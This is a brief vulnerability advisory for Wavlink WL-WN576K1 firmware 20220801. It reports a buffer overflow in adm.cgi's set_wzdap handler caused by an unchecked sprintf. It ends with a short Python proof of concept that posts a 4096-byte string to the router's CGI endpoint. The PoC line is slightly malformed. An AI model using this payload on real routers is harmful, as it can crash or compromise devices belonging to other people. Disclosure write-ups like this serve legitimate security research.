# buff overflow

## WAVLINK_WL_WN576K1

version: 20220801

## Description:

There is a buff overflow in adm.cgi/set_wzdap

## Source:

you may download it from : 

[WL-WN576K1 - WAVLINK See the world! Powered by Wavlink](https://www.wavlink.com/en_us/firmware/details/5ce8519bd8.html)

 Analyse:

![](4.png)

![](5.png)

get value from wlan_ssid2g, and we can set TouchLinkEn in wireless.cgi, then call sprintf, cause buff overflow

## POC

```
url = "http://192.168.0.1/cgi-bin/adm.cgi"
payload = 'a'*0x1000 + '\n'

r = requests.post(url, data={ 'page':'wzdap', 'key': + payload})
```
